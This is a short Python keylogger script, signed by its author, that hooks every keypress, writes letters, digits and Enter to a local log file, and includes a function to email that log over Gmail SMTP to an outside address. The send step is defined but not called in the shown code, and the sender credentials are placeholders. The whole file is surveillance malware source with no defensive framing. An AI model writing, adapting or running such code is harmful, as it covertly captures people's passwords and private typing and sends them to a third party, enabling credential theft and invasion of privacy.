#Coded by Hudul
#imports
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import keyboard
#funcions

def send_email(file_path, to_email, from_email, password):
    with open(file_path, 'r') as file:
        message_content = file.read()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = 'Konu'
    msg.attach(MIMEText(message_content, 'plain'))
    server.sendmail(from_email, to_email, msg.as_string())
    server.quit()

def send():
    send_email(file_path=log_path,to_email='xxxhudul@gmail.com',from_email='@gmail.com',password='gonderici_sifre')

def log_keystrokes(e, log_file_path):
    try:
        if e.event_type == keyboard.KEY_DOWN and (e.name.isalnum() or e.name == 'enter'):
            with open(log_file_path, 'a') as log_file:
                log_file.write(f"{e.name}\n")
    except Exception as ex:
        print(f"Error: {ex}")

log_path = "C:/xhudul/log.txt"
keyboard.hook(lambda e: log_keystrokes(e, log_path))

keyboard.wait()
